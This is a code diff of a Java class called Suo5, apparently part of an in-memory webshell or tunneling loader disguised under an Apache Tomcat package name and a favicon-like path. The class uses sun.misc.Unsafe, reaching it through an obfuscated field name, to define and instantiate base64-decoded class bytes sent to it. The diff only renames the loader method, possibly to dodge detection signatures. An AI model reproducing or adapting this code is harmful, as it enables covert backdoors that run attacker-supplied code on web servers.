@@ -3,7 +3,7 @@ package org.apache.catalina.servlets.sl;
 public class Suo5 {
     private static final String pathPattern= "/faviconsuo";
 
-    public static Class unsafeloader(byte[] bytes) throws Exception {
+    public static Class unsafedefine(byte[] bytes) throws Exception {
         java.lang.reflect.Field field = sun.misc.Unsafe.class.getDeclaredField(new String(new byte[]{116,104,101,85,110,115,97,102,101}));
         field.setAccessible(true);
         Object unsafe = field.get(null);
@@ -39,7 +39,7 @@ public class Suo5 {
                     clazzByte=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{clazzBase64});
                 }
 
-                Class clazz = unsafeloader(clazzByte);
+                Class clazz = unsafedefine(clazzByte);
                 clazz.newInstance().equals(args);
             } catch (Exception e) {
                 e.printStackTrace();
